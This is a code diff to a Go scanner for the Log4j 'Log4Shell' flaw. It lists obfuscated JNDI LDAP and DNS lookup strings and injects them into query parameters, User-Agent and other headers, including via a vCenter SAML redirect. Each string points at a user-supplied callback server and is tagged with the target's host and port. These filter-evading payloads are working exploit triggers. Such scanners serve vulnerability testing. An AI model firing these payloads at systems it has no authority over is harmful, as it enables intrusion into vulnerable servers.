@@ -30,25 +30,24 @@ func ScanIP(hostUrl string, serverUrlLDAP string, serverUrlDNS string, reqType s
         }
 
         log.Debugf("Target URL: %s", hostUrl)
-        // fmt.Println(LDAPServer.sChan)
         var LDAPpayloads = []string{
-                "${jndi:ldap://",
-                "${${::-j}ndi:ldap://",
-                "${${lower:jndi}:${lower:ldap}://",
-                "${${lower:${lower:jndi}}:${lower:ldap}://",
-                "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://",
-                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://",
-                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}${lower:p}}://",
+                "${jndi:ldap:",
+                "${${::-j}ndi:ldap:",
+                "${${lower:jndi}:${lower:ldap}:",
+                "${${lower:${lower:jndi}}:${lower:ldap}:",
+                "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}:",
+                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:",
+                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}${lower:p}}:",
         }
 
         var DNSpayloads = []string{
-                "${jndi:dns://",
-                "${${::-j}ndi:dns://",
-                "${${lower:jndi}:${lower:dns}://",
-                "${${lower:${lower:jndi}}:${lower:dns}://",
-                "${${lower:j}${lower:n}${lower:d}i:${lower:dns}://",
-                "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://",
-                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:d}n${lower:s}}://",
+                "${jndi:dns:",
+                "${${::-j}ndi:dns:",
+                "${${lower:jndi}:${lower:dns}:",
+                "${${lower:${lower:jndi}}:${lower:dns}:",
+                "${${lower:j}${lower:n}${lower:d}i:${lower:dns}:",
+                "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}:",
+                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:d}n${lower:s}}:",
         }
 
         switch reqType {
@@ -110,13 +109,13 @@ func ScanIPLDAPUi(Url string, serverUrl string, payload string, client *http.Cli
                 redirectUrl := response.Header.Get("location")
                 if len(redirectUrl) > 0  {
                         newUrl, _ := url.Parse(redirectUrl)
-                        newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
-                        traceHint := fmt.Sprintf("%s_%s_%s", baseUrl.Hostname(), baseUrl.Port(), "VCenter")
-                        targetUserAgent := payload + serverUrl+ "/" + traceHint + "_User-Agent" + "}"
-                        targetHeader := payload + serverUrl+ "/" + traceHint + "}"
+                        newTargetUrl := fmt.Sprintf("%s://%s%s?SAMLRequest=", newUrl.Scheme, newUrl.Host, newUrl.Path)
+                        traceHint := fmt.Sprintf("%s/%s_VCenter", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
+                        targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
+                        targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
                         newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
                         newRequest.Header.Set("User-Agent", targetUserAgent)
-                        addCommonHeadersLDAP(&newRequest.Header,targetHeader)
+                        addCommonHeaders(&newRequest.Header,targetHeader)
                         newResponse, err := client.Do(newRequest)
                         if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                                 log.Debug(err)
@@ -140,19 +139,19 @@ func ScanIPLDAP(Url string, serverUrl string, payload string, client *http.Clien
         defer wg.Done()
         baseUrl, err := url.Parse(Url)
         param := url.Values{}
-        traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
-        param.Add("x", payload + serverUrl+ "/" + traceHint + "}")
+        traceHint := fmt.Sprintf("%s_%s", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
+        targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
+        targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
+        param.Add("x", fmt.Sprintf("%s//%s/%s_GET}", payload, serverUrl, traceHint))
         baseUrl.RawQuery = param.Encode()
         targetUrl := baseUrl.String()
-        targetUserAgent := payload + serverUrl+ "/" + traceHint + "_User-Agent" + "}"
-        targetHeader := payload + serverUrl+ "/" + traceHint + "}"
         request, err := http.NewRequest("GET", targetUrl, nil)
         if err != nil {
                 pterm.Error.Println(err)
                 log.Fatal(err)
         }
         request.Header.Set("User-Agent", targetUserAgent)
-        addCommonHeadersLDAP(&request.Header,targetHeader)
+        addCommonHeaders(&request.Header,targetHeader)
         response, err := client.Do(request)
         if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                 log.Debug(err)
@@ -188,12 +187,14 @@ func ScanIPDNSUi(Url string, serverUrl string, payload string, client *http.Clie
                 redirectUrl := response.Header.Get("location")
                 if len(redirectUrl) > 0  {
                         newUrl, _ := url.Parse(redirectUrl)
-                        newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
-                        targetUserAgent := payload + serverUrl+ "}"
-                        targetHeader := payload + serverUrl+ "}"
+                        // newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
+                        newTargetUrl := fmt.Sprintf("%s://%s%s?SAMLRequest=", newUrl.Scheme, newUrl.Host, newUrl.Path)
+                        traceHint := fmt.Sprintf("%s/%s_VCenter", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
+                        targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
+                        targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
                         newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
                         newRequest.Header.Set("User-Agent", targetUserAgent)
-                        addCommonHeadersDNS(&newRequest.Header,targetHeader)
+                        addCommonHeaders(&newRequest.Header,targetHeader)
                         newResponse, err := client.Do(newRequest)
                         if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                                 log.Debug(err)
@@ -216,18 +217,19 @@ func ScanIPDNS(Url string, serverUrl string, payload string, client *http.Client
         defer wg.Done()
         baseUrl, err := url.Parse(Url)
         param := url.Values{}
-        param.Add("x", payload + serverUrl+ "}")
+        traceHint := fmt.Sprintf("%s_%s", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
+        targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
+        targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
+        param.Add("x", fmt.Sprintf("%s//%s/%s_GET}", payload, serverUrl, traceHint))
         baseUrl.RawQuery = param.Encode()
         targetUrl := baseUrl.String()
-        targetUserAgent := payload + serverUrl+ "}"
-        targetHeader := payload + serverUrl+ "}"
         request, err := http.NewRequest("GET", targetUrl, nil)
         if err != nil {
                 pterm.Error.Println(err)
                 log.Fatal(err)
         }
         request.Header.Set("User-Agent", targetUserAgent)
-        addCommonHeadersDNS(&request.Header,targetHeader)
+        addCommonHeaders(&request.Header,targetHeader)
         response, err := client.Do(request)
         if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                 log.Debug(err)
